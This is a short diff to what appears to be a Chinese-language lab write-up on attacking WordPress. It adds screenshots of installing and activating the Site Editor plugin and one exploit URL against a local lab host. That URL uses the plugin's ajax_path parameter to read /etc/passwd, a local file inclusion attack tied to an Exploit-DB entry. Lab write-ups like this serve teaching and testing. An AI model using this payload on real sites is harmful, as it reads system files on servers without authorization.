@@ -248,7 +248,13 @@ https://www.exploit-db.com/exploits/44340
 <img  alt="image" src="https://github.com/user-attachments/assets/6ad777c8-4c35-4674-811c-acf97e7ce8f9">
 
     安裝site Editor套件
+<img  alt="image" src="https://github.com/user-attachments/assets/d1b363e7-3d99-4cb8-bcca-19488461a830">
 
+    Active Site Editor、Hello Dolly套件
+<img  alt="image" src="https://github.com/user-attachments/assets/64b1d4a5-6ef5-43d3-b809-09999945b752">
+
+    
 Attack WordPress
 ---
-
+    http://192.168.0.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+<img  alt="image" src="https://github.com/user-attachments/assets/d1cb67c7-2833-4e80-ad7f-90766bf3784a">
